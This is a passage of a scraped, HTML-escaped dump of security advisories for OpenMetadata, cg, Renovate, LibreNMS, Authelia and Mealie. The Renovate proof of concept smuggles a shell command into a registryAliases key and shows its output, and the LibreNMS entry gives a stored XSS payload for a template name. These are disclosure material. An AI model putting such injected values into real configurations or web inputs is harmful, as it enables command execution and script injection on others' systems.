[`SimpleEvaluationContext`](https:&#x2F;&#x2F;docs.spring.io&#x2F;spring-framework&#x2F;docs&#x2F;current&#x2F;javadoc-api&#x2F;org&#x2F;springframework&#x2F;expression&#x2F;spel&#x2F;support&#x2F;SimpleEvaluationContext.html) to exclude *references to Java types, constructors, and bean references*.",

.java#L113'>https://github.com/open-metadata/OpenMetadata/blob/main/openmetadata-service/src/main/java/org/openmetadata/service/jdbi3/PolicyRepository.java#L113</a></li></ul>"

            "details": "<b>cg vulnerable to an Open Redirect Vulnerability on Referer Header</b><br>### Summary\n\nA vulnerability has been discovered in the handling of the referrer header in the application, which could allow an attacker to conduct open redirects. The issue arises from improper validation of the referrer header in certain conditions. By manipulating the referrer header, an attacker could potentially redirect users to malicious websites, phishing pages, or other dangerous destinations.\n\n### PoC\n\nIf you change the referer header, you will be redirected to that domain without verifying.\n\nhttps:&#x2F;&#x2F;github.com&#x2F;Clinical-Genomics&#x2F;cg&#x2F;blob&#x2F;master&#x2F;cg&#x2F;server&#x2F;invoices&#x2F;views.py#L173\n\n### Impact\n\nAn attacker exploiting this vulnerability could trick users into visiting malicious websites or disclose sensitive information by redirecting them to unintended destinations. This could lead to various attacks including phishing, malware distribution, or further exploitation of other vulnerabilities.",

            "id": "<a href='https://osv.dev/vulnerability/GHSA-rqgv-292v-5qgr' target='_blank'>GHSA-rqgv-292v-5qgr</a>",
            "details": "<b>Renovate vulnerable to arbitrary command injection via helmv3 manager and registryAliases</b><br>### Summary\n\nAttackers with commit access to the default branch of a repo using Renovate could manipulate helmv3 registryAliases to execute arbitrary commands.\n\n### Details\n\nSince [#26848](https:&#x2F;&#x2F;github.com&#x2F;renovatebot&#x2F;renovate&#x2F;pull&#x2F;26848), `registryAliases` has become mergeable. This means that the helmv3 manager started honoring its value and uses a `helm repo add &amp;lt;key&amp;gt; &amp;lt;parameters&amp;gt;` command for each defined alias. See source code: https:&#x2F;&#x2F;github.com&#x2F;renovatebot&#x2F;renovate&#x2F;blob&#x2F;23f3df6216375cb5bcfe027b0faee304f877f891&#x2F;lib&#x2F;modules&#x2F;manager&#x2F;helmv3&#x2F;artifacts.ts#L80\nThe key was not quoted, leading to the ability to use variable references (`$FOO`) in it and have them printed by Renovate on the pull request, or even running any shell commands.\n\n### PoC\n\nInside a repository where Renovate runs, add a Helm chart with an outdated dependency, for example:\n\ntest-chart&#x2F;Chart.yaml:\n\n```\napiVersion: v2\nname: redis\nversion: 1.0.0\ndependencies:\n  - name: redis\n    version: 18.13.10\n    repository: oci:&#x2F;&#x2F;registry-1.docker.io&#x2F;bitnamicharts\n```\n\ntest-chart&#x2F;Chart.lock:\n\n```\ndependencies:\n- name: redis\n  repository: oci:&#x2F;&#x2F;registry-1.docker.io&#x2F;bitnamicharts\n  version: 18.13.10\ndigest: sha256:11267bd32ea6c5c120ddebbb9f21e4a3c7700a961aa1a27ddb55df1fb8059a38\ngenerated: &quot;2024-02-16T13:31:20.807026334Z&quot;\n```\n\nThen add the following `renovate.json`:\n\n```json\n{\n  &quot;$schema&quot;: &quot;https:&#x2F;&#x2F;docs.renovatebot.com&#x2F;renovate-schema.json&quot;,\n  &quot;extends&quot;: [\n    &quot;config:base&quot;\n  ],\n  &quot;registryAliases&quot;: {\n    &quot;foo&#x2F;bar || sh -c &#x27;ls &#x2F;; exit 1&#x27; &amp;gt;&amp;2&quot;: &quot;registry.example.com&#x2F;proxy&quot;\n  }\n}\n```\n\nOnce Renovate runs on the repository, it will create a pull request, and add a comment titled &quot;Artifact update problem&quot; containing the following text:\n\n```\nFile name: test-chart&#x2F;Chart.lock\n\nCommand failed: helm repo add foo&#x2F;bar || sh -c &#x27;ls &#x2F;; exit 1&#x27; &amp;gt;&amp;2 registry.example.com&#x2F;proxy --force-update\nError: &quot;helm repo add&quot; requires 2 arguments\n\nUsage:  helm repo add [NAME] [URL] [flags]\nbin\nboot\ndev\netc\ngo\nhome\nlib\nlib32\nlib64\nlibx32\nmedia\nmnt\nopt\nproc\nroot\nrun\nsbin\nsrv\nsys\ntmp\nusr\nvar\n```\n\nThis shows that the `ls` command executed successfully, and we can even see its output.\n\nNote that redirecting any output you want to see to stderr (`&amp;gt;&amp;2`) and making sure the final command fails (`exit 1`) is required in this case, as Renovate only adds a comment if the command fails, and it contains only stderr (not stdout) output.\n\n### Impact\n\nAll Renovate versions from 37.158.0 up until 37.199.0 were affected. This vulnerability allows full access to Renovate&#x27;s execution environment. The level of severity depends on how Renovate is deployed (Docker, Kubernetes, CI pipeline, ...) and whether Renovate is being offered to untrusted users&#x2F;repositories.\n",

            "details": "<b>LibreNMS uses Improper Sanitization on Service template name leads to Stored XSS</b><br>### Summary\nThere is improper sanitization on Service template name which is reflecting in delete button onclick event. This value can be modified and crafted as any other javascript code.\n\n \n### Vulnerable Code\nhttps:&#x2F;&#x2F;github.com&#x2F;librenms&#x2F;librenms&#x2F;blob&#x2F;a61c11db7e8ef6a437ab55741658be2be7d14d34&#x2F;app&#x2F;Http&#x2F;Controllers&#x2F;ServiceTemplateController.php#L67C23-L67C23\n\nAbove is vulnerable code line which needs to be properly sanitized \n\n### PoC\n1. Go to &#x2F;services&#x2F;templates\n2. Enter name as `testing&#x27;, &#x27;14&#x27;, &#x27;http:&#x2F;&#x2F;172.105.62.194:8000&#x2F;services&#x2F;templates&#x2F;14&#x27;);alert(1);&#x2F;&#x2F;`\n3. Submit it and try to delete it, you will see popup\n\nIf you inspect element on delete button, you will notice this:-\n&amp;lt;img width=&quot;748&quot; alt=&quot;Screenshot 2023-11-23 at 9 30 24\u202fPM&quot; src=&quot;https:&#x2F;&#x2F;user-images.githubusercontent.com&#x2F;31764504&#x2F;285260018-7672a93d-e29b-4444-8057-e6ffcb8dabfc.png&quot;&amp;gt;\n\n\n### Impact\nCross site scripting can lead to cookie stealing or an attacker can execute any other feature using this feature.\n",

            "details": "<b>Authelia&#x27;s Group Changes may not have the expected results (YAML file backend)</b><br>### Impact\n\nUnder very specific conditions changes to a users groups may not have the expected results.\n\nThe specific conditions are:\n\n* The file authentication backend is being used.\n* The [watch](https:&#x2F;&#x2F;www.authelia.com&#x2F;configuration&#x2F;first-factor&#x2F;file&#x2F;#watch) option is set to true.\n* The [refresh_interval](https:&#x2F;&#x2F;www.authelia.com&#x2F;configuration&#x2F;first-factor&#x2F;introduction&#x2F;#refresh_interval) is configured to a non-disabled value.\n* The users groups are adjusted by an administrator.\n* The user attempts to access a resource that their groups previously had access to but their new groups do not have access to.\n\nWhen these conditions are met administrators may find the changes are not taken into account by access control for longer than expected periods. While this may not necessarily be a security vulnerability it&#x27;s security-adjacent and because of the unexpected nature of it and our dedication to a security-first culture we feel it&#x27;s important to make users aware of this behaviour utilizing a security advisory and the existence of a fix.\n\nThis:\n\n* Can not have an Impact for Unauthenticated Users.\n* Can not have an Impact for Configurations utilizing the LDAP Backend.\n* Can not be directly or indirectly caused by a users or third parties actions.\n\n### Patches\n\nThis behaviour was identified **_after_** it was inadvertently fixed in the `master` branch during the multi-cookie domain rework (i.e. between feature releases). A patch for prior versions can be provided upon request. The fix was to ensure the details are updated regardless of backend, it was a small oversight in previous functionality which made refreshing ineffectual prior to v4.37.0.\n\n### Workarounds\n\nEnsure you restart between user database changes.\n\n### References\n\n* https:&#x2F;&#x2F;github.com&#x2F;authelia&#x2F;authelia&#x2F;blob&#x2F;v4.37.5&#x2F;internal&#x2F;handlers&#x2F;handler_verify.go#L376-L394\n",

            "ecosystem": "GIT",
            "id": "<a href='https://osv.dev/vulnerability/CVE-2024-31994' target='_blank'>CVE-2024-31994</a>",
            "details": "<b></b><br>Mealie is a self hosted recipe manager and meal planner. Prior to 1.4.0, an attacker can point the image request to an arbitrarily large file. Mealie will attempt to retrieve this file in whole. If it can be retrieved, it may be stored on the file system in whole (leading to possible disk consumption), however the more likely scenario given resource limitations is that the container will OOM during file retrieval if the target file size is greater than the allocated memory of the container. At best this can be used to force the container to infinitely restart due to OOM (if so configured in `docker-compose.yml), or at worst this can be used to force the Mealie container to crash and remain offline. In the event that the file can be retrieved, the lack of rate limiting on this endpoint also permits an attacker to generate ongoing requests to any target of their choice, potentially contributing to an external-facing DoS attack. This vulnerability is fixed in 1.4.0.",

            "id": "<a href='https://osv.dev/vulnerability/CVE-2024-31991' target='_blank'>CVE-2024-31991</a>",
            "details": "<b></b><br>Mealie is a self hosted recipe manager and meal planner. Prior to 1.4.0, the safe_scrape_html function utilizes a user-controlled URL to issue a request to a remote server. Based on the content of the response, it will either parse the content or disregard it. This function, nor those that call it, add any restrictions on the URL that can be provided, nor is it restricted to being an FQDN (i.e., an IP address can be provided). As this function\u2019s return will be handled differently by its caller depending on the response, it is possible for an attacker to use this functionality to positively identify HTTP(s) servers on the local network with any IP&#x2F;port combination. This issue can result in any authenticated user being able to map HTTP servers on a local network that the Mealie service has access to. Note that by default any user can create an account on a Mealie server, and that the default changeme@example.com user is available with its hard-coded password. This vulnerability is fixed in 1.4.0.",

            "id": "<a href='https://osv.dev/vulnerability/CVE-2024-31992' target='_blank'>CVE-2024-31992</a>",
            "details": "<b></b><br>Mealie is a self hosted recipe manager and meal planner. Prior to 1.4.0, the safe_scrape_html function utilizes a user-controlled URL to issue a request to a remote server, however these requests are not rate-limited. While there are efforts to prevent DDoS by implementing a timeout on requests, it is possible for an attacker to issue a large number of requests to the server which will be handled in batches based on the configuration of the Mealie server. The chunking of responses is helpful for mitigating memory exhaustion on the Mealie server, however a single request to an arbitrarily large external file (e.g. a Debian ISO) is often sufficient to completely saturate a CPU core assigned to the Mealie container. Without rate limiting in place, it is possible to not only sustain traffic against an external target indefinitely, but also to exhaust the CPU resources assigned to the Mealie container. This vulnerability is fixed in 1.4.0.",
